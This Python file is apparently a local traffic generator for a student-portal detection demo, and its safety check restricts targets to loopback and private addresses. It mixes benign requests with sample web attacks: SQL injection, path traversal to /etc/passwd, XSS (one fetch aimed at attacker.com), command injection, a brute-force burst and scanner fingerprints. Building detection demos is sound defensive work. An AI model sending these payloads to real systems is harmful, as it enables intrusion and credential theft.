"""
Safe Local Traffic Generator for Student Portal Demo Server.
Generates synthetic benign client workflows and simulated cyber-attack patterns.
SAFETY INVARIANT: Strictly hard-coded to localhost/loopback and RFC1918 private subnets.
"""

from __future__ import annotations
import os
import sys
import time
import random
import ipaddress
import threading
import logging
from typing import Optional, List, Dict, Any
from urllib.parse import urlparse

import httpx

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [traffic-gen] %(message)s"
)
logger = logging.getLogger("traffic-gen")

# Configurable Settings
TARGET_URL = os.environ.get("DEMO_SERVER_URL", "http://127.0.0.1:8001").rstrip("/")
TRAFFIC_MODE = os.environ.get("TRAFFIC_MODE", "mixed").lower()  # "benign" or "mixed"
PKTS_PER_SEC = int(os.environ.get("PKTS_PER_SEC", "20"))


# ==========================================
# SAFETY GUARDRAILS (INDUSTRY-LEVEL REQUIREMENT 1)
# ==========================================

def assert_safe_target(url: str) -> None:
    """
    Refuses execution if target is not loopback or private RFC1918 space.
    Guarantees synthetic attack simulation never escapes local development/demo bounds.
    """
    parsed = urlparse(url)
    hostname = parsed.hostname or "127.0.0.1"

    if hostname in ("localhost", "127.0.0.1", "::1", "demo-server", "demo_server"):
        return

    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_loopback or ip.is_private:
            return
    except ValueError:
        pass

    raise AssertionError(
        f"🚨 FATAL SAFETY VIOLATION: Traffic generator refused to start. "
        f"Target '{hostname}' is not a verified loopback or private RFC1918 address."
    )


# Pool of simulated student client IPs (RFC1918 private space)
BENIGN_CLIENT_IPS = [f"10.0.1.{i}" for i in range(10, 60)]
ATTACKER_CLIENT_IPS = [
    "10.0.5.99",   # Persistent SQLi attacker
    "10.0.5.105",  # Brute-force botnet node
    "10.0.5.110",  # Scanner / fuzzing node
    "10.0.5.120",  # Path traversal / LFI probe
    "10.0.5.130",  # Automated scanner (Nikto/Sqlmap)
]

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# Simulated Attack Vectors (Educational / Detection Demo Only)
SIMULATED_ATTACKS = [
    # 1. SQL Injection
    {
        "method": "POST",
        "path": "/login",
        "data": {"username": "admin' OR '1'='1", "password": "password123"},
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "SQL Injection in Login Form",
    },
    {
        "method": "GET",
        "path": "/courses?search=CS' UNION SELECT null,username,password FROM users--",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "SQL Injection in Search Query",
    },
    # 2. Path Traversal
    {
        "method": "GET",
        "path": "/results?file=../../../../etc/passwd",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "Path Traversal (LFI)",
    },
    {
        "method": "GET",
        "path": "/courses?doc=..%2f..%2fwindows%2fwin.ini",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "Encoded Path Traversal",
    },
    # 3. Cross-Site Scripting (XSS)
    {
        "method": "POST",
        "path": "/courses/enroll",
        "data": {"course_code": "<script>alert('XSS-DEMO')</script>"},
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "Stored XSS Injection",
    },
    {
        "method": "GET",
        "path": "/courses?q=<img src=x onerror=fetch('http://attacker.com')>",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "Reflected XSS Probe",
    },
    # 4. Command Injection
    {
        "method": "GET",
        "path": "/results?report_id=101; cat /etc/passwd",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "OS Command Injection",
    },
    # 5. Known-Bad Scanners
    {
        "method": "GET",
        "path": "/",
        "headers": {"User-Agent": "sqlmap/1.7#stable (http://sqlmap.org)"},
        "type": "Automated Scanner Fingerprint (sqlmap)",
    },
    {
        "method": "GET",
        "path": "/wp-admin",
        "headers": {"User-Agent": "Mozilla/5.0 (Nikto/2.1.6)"},
        "type": "Vulnerability Scanner Probe (Nikto)",
    },
    # 6. Honeypot Probes
    {
        "method": "GET",
        "path": "/admin",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "Administrative Honeypot Probe",
    },
    {
        "method": "GET",
        "path": "/phpmyadmin/index.php",
        "headers": {"User-Agent": random.choice(BENIGN_USER_AGENTS)},
        "type": "Reconnaissance against Database Admin Path",
    },
]


class SafeTrafficGenerator:
    """
    Autonomous synthetic traffic simulator. Emits real HTTP/TCP connections
    over localhost so the packet sniffer captures genuine network frames.
    """

    def __init__(
        self,
        target_url: str = TARGET_URL,
        mode: str = TRAFFIC_MODE,
        pkts_per_sec: int = PKTS_PER_SEC,
    ):
        assert_safe_target(target_url)
        self.target_url = target_url
        self.mode = mode
        self.pkts_per_sec = max(1, min(500, pkts_per_sec))
        self._stop_event = threading.Event()
        self._worker_thread: Optional[threading.Thread] = None
        self.client = httpx.Client(timeout=2.0, verify=False)
        self.total_generated = 0
        self.attacks_injected = 0

    def start(self) -> None:
        """Start traffic simulation in dedicated thread."""
        self._stop_event.clear()
        self._worker_thread = threading.Thread(
            target=self._run_loop, name="traffic-generator-worker", daemon=True
        )
        self._worker_thread.start()
        logger.info(f"Safe Traffic Generator started. Target: {self.target_url} | Mode: {self.mode} | Rate: {self.pkts_per_sec} req/s")

    def stop(self) -> None:
        self._stop_event.set()
        if self._worker_thread and self._worker_thread.is_alive():
            self._worker_thread.join(timeout=2.0)
        self.client.close()
        logger.info(f"Traffic generator stopped. Total emitted: {self.total_generated}")

    def inject_test_attack(self) -> List[Dict[str, Any]]:
        """
        Manually inject one SQLi, one brute-force burst, and one honeypot probe
        for interactive demonstration purposes.
        """
        results = []
        attacker_ip = "10.0.5.222"
        logger.info("⚡ Injecting live test attack suite for demonstration...")

        # 1. SQL Injection attack
        try:
            r1 = self.client.post(
                f"{self.target_url}/login",
                data={"username": "admin' OR '1'='1", "password": "hacked"},
                headers={"X-Forwarded-For": attacker_ip, "User-Agent": "Mozilla/5.0 (DemoAttacker)"},
            )
            results.append({"type": "SQL Injection", "status": r1.status_code, "ip": attacker_ip})
        except Exception as e:
            results.append({"type": "SQL Injection", "error": str(e)})

        # 2. Brute-Force Burst (6 failed logins)
        for i in range(6):
            try:
                self.client.post(
                    f"{self.target_url}/login",
                    data={"username": "student", "password": f"wrongpass{i}"},
                    headers={"X-Forwarded-For": attacker_ip, "User-Agent": "Mozilla/5.0"},
                )
            except Exception:
                pass
        results.append({"type": "Brute Force Burst", "attempts": 6, "ip": attacker_ip})

        # 3. Honeypot probe
        try:
            r3 = self.client.get(
                f"{self.target_url}/admin",
                headers={"X-Forwarded-For": attacker_ip, "User-Agent": "Mozilla/5.0"},
            )
            results.append({"type": "Honeypot /admin Hit", "status": r3.status_code, "ip": attacker_ip})
        except Exception as e:
            results.append({"type": "Honeypot Hit", "error": str(e)})

        self.attacks_injected += 3
        return results

    def _run_loop(self) -> None:
        """Main generator dispatch loop."""
        while not self._stop_event.is_set():
            delay = 1.0 / self.pkts_per_sec

            # Determine whether to generate benign or attack packet
            is_attack = False
            if self.mode == "mixed" and random.random() < 0.20:
                is_attack = True

            if is_attack:
                self._dispatch_simulated_attack()
            else:
                self._dispatch_benign_request()

            self.total_generated += 1
            time.sleep(delay)

    def _dispatch_benign_request(self) -> None:
        """Dispatch a safe student portal interaction."""
        src_ip = random.choice(BENIGN_CLIENT_IPS)
        ua = random.choice(BENIGN_USER_AGENTS)
        headers = {"X-Forwarded-For": src_ip, "User-Agent": ua}

        endpoints = [
            ("GET", "/", None),
            ("GET", "/courses", None),
            ("GET", "/dashboard", None),
            ("GET", "/results", None),
            ("GET", "/fees", None),
            ("POST", "/login", {"username": "student", "password": "college2026"}),
        ]
        method, path, data = random.choice(endpoints)
        url = f"{self.target_url}{path}"

        try:
            if method == "GET":
                self.client.get(url, headers=headers)
            else:
                self.client.post(url, data=data, headers=headers)
        except Exception:
            pass

    def _dispatch_simulated_attack(self) -> None:
        """Dispatch a synthetic attack vector."""
        src_ip = random.choice(ATTACKER_CLIENT_IPS)
        attack = random.choice(SIMULATED_ATTACKS)
        headers = dict(attack.get("headers", {}))
        headers["X-Forwarded-For"] = src_ip

        method = attack["method"]
        url = f"{self.target_url}{attack['path']}"
        data = attack.get("data")

        try:
            if method == "GET":
                self.client.get(url, headers=headers)
            else:
                self.client.post(url, data=data, headers=headers)
            self.attacks_injected += 1
        except Exception:
            pass


# Global singleton instance
generator = SafeTrafficGenerator()


def main() -> None:
    generator.start()
    try:
        while True:
            time.sleep(1.0)
    except KeyboardInterrupt:
        generator.stop()


if __name__ == "__main__":
    main()
